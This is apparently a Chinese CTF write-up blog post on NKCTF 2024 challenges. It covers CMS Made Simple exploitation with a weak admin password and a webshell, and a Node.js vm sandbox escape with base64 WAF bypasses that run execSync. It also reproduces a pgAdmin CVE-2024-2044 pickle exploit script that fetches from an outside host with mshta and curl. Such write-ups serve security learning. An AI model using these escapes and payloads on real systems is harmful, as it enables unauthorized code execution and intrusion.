@@ -1,0 +1,226 @@
+<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024NKCTF | AsaL1n's blog</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2024NKCTF_WP 在大家的一同努力之下获取了第四 欸，好爽  my first cms打开看到是个cms 网上搜了一圈 是CMSMS   一个php+mysql+smarty写的cms dirsearch扫描一下，看到存在admin&#x2F;login.php路由，直接简单访问  弱密码 admin&#x2F;Admin123成功登录  出题人卡字典，良心大大滴坏  网上搜搜这个cms的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024NKCTF">
+<meta property="og:url" content="https://asal1n.github.io/2024/03/26/2024NKCTF/index.html">
+<meta property="og:site_name" content="AsaL1n&#39;s blog">
+<meta property="og:description" content="2024NKCTF_WP 在大家的一同努力之下获取了第四 欸，好爽  my first cms打开看到是个cms 网上搜了一圈 是CMSMS   一个php+mysql+smarty写的cms dirsearch扫描一下，看到存在admin&#x2F;login.php路由，直接简单访问  弱密码 admin&#x2F;Admin123成功登录  出题人卡字典，良心大大滴坏  网上搜搜这个cms的">
+<meta property="og:locale">
+<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
+<meta property="article:published_time" content="2024-03-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-26T00:57:32.060Z">
+<meta property="article:author" content="AsaL1n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2024/03/26/2024NKCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024NKCTF',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-26 08:57:32'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="AsaL1n's blog"><span class="site-name">AsaL1n's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024NKCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-25T16:00:00.000Z" title="Created 2024-03-26 00:00:00">2024-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-26T00:57:32.060Z" title="Updated 2024-03-26 08:57:32">2024-03-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024NKCTF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2024NKCTF-WP"><a href="#2024NKCTF-WP" class="headerlink" title="2024NKCTF_WP"></a>2024NKCTF_WP</h1><blockquote>
+<p>在大家的一同努力之下获取了第四</p>
+<p>欸，好爽</p>
+</blockquote>
+<h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开看到是个cms 网上搜了一圈 是CMSMS </p>
+<p><img src="/../../../../img/image-20240323191726863.png" alt="image-20240323191726863"></p>
+<p>一个php+mysql+smarty写的cms</p>
+<p>dirsearch扫描一下，看到存在admin&#x2F;login.php路由，直接简单访问</p>
+<p><img src="/../../../../img/image-20240323191834639.png" alt="image-20240323191834639"></p>
+<p>弱密码 admin&#x2F;Admin123成功登录</p>
+<blockquote>
+<p>出题人卡字典，良心大大滴坏</p>
+</blockquote>
+<p>网上搜搜这个cms的漏洞</p>
+<p>看到两个可能的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/capture0x/CMSMadeSimple">https://github.com/capture0x/CMSMadeSimple</a></p>
+<p>和<a target="_blank" rel="noopener" href="https://github.com/capture0x/CMSMadeSimple2">capture0x&#x2F;CMSMadeSimple2: CMS Made Simple Version: 2.2.19 - SSTI (github.com)</a></p>
+<p>注意到使用ssti注入的时候会遇到一个setting，绕不过去</p>
+<p>前面那个可以</p>
+<p><img src="/../../../../img/image-20240323192648185.png" alt="image-20240323192648185"></p>
+<p>没有办法直接读取文件，尝试写马</p>
+<p><img src="/../../../../img/image-20240323192717004.png" alt="image-20240323192717004"></p>
+<p>antsword链接</p>
+<p><img src="/../../../../img/image-20240323192731376.png" alt="image-20240323192731376"></p>
+<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>访问&#x2F;secret获取源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>vm逃逸 过滤了很多东西</p>
+<p>存在try catch方法 应该是使用proxy方法，报错执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
+
+<p>通过污染tostring属性和proxy报错回显，完成一个注入</p>
+<p>注意到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以利用process污染__filename属性 达到读取任意文件的目的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">      throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">          const c = arguments.callee.caller;</span></span><br><span class="line"><span class="string">          const p = (c.constructor.constructor(&#x27;return pr&#x27;%2b&#x27;ocess&#x27;))();</span></span><br><span class="line"><span class="string">          p.__filename = &quot;/flag&quot;;</span></span><br><span class="line"><span class="string">          return &quot;\\n&quot;;</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">      &#125;)</span></span><br><span class="line"><span class="string">      &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="comment">// let process.__filename=&#x27;test&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  console.log(process.__filename);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//  waf(code)</span></span><br><span class="line">    <span class="keyword">const</span> result = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test&#x27;</span>+result);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fail&#x27;</span>+e.<span class="property">message</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">__filename</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>现在问题来到了怎么绕过</p>
+<p>正常的+ [] join啥的都寄了，没法绕过</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhangshengrong.com/p/bYXxqOkL1Z/">https://www.zhangshengrong.com/p/bYXxqOkL1Z/</a></p>
+<p>参考这个文章，base64绕过，读取文件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable language_">global</span> = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">    <span class="keyword">const</span> pp = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">`Buf`</span>)))),<span class="number">1</span>)(<span class="string">`cmV0dXJuIHByb2Nlc3M=`</span>,<span class="string">`base64`</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params">pp</span>))();</span><br><span class="line">    p.<span class="property">__filename</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>ok读取不到，看来要rce</p>
+<p><img src="/../../../../img/image-20240323194453436.png" alt="image-20240323194453436"></p>
+<p>测试了一下，好像不出我网，考虑echo读取文件之后，污染相关的__filename读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">      const cc = arguments.callee.caller;</span><br><span class="line">      const global = (cc.constructor.constructor(&#x27;return global&#x27;))();</span><br><span class="line">      const return_Process = Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`cmV0dXJuIHByb2Nlc3M=`,`base64`).toString();</span><br><span class="line">      const Process = (cc.constructor.constructor(return_Process))();</span><br><span class="line">      Process.__filename=&quot;1&quot;;</span><br><span class="line">      const re = Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;eva&#x27;)));</span><br><span class="line">      const an = Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCIvcmVhZGZsYWcgPjEiKQ==`,`base64`).toString();</span><br><span class="line">      re(an);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>然后访问&#x2F;secret即可</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>此题目实际上是出网的，只是忘记了[]被过滤，网上看到很多的师傅也是成功的弹shell穿了这个题目</p>
+<p>arguments.callee.caller可以获取沙箱外的一个对象，外面可以利用这个点完成攻击</p>
+<p>porcess显然是没有这个__filename的对象的，所以回去prototype里面去寻找相关的__filename去寻找 通过’.&#x2F;hack.js’ 然后污染shell.js的内容完成rce</p>
+<p>解题方法还是很多的，欢迎大家讨论</p>
+<h2 id="tacooooo"><a href="#tacooooo" class="headerlink" title="tacooooo"></a>tacooooo</h2><p>hint给了提示是attack_tacooooo，猜测密码就是tacooooo 直接登录</p>
+<p>发现是pgAdminv8.3</p>
+<p>搜获cve <a target="_blank" rel="noopener" href="https://github.com/pgadmin-org/pgadmin4/issues/7258">Unsafe Deserialization and Remote Code Execution by an Authenticated user in pgAdmin 4 (CVE-2024-2044) · Issue #7258 · pgadmin-org&#x2F;pgadmin4 (github.com)</a></p>
+<p>直接下载一个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;mshta.exe http://&#123;HOST&#125;/&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;curl http://&#123;HOST&#125;/&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目表示无bash 无curl</p>
+<p>.&#x2F;busybox sh可以这样</p>
+<p>在环境变量内找到flag</p>
+<h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>mvc架构的php审计，先放着，学了在拿来分析</p>
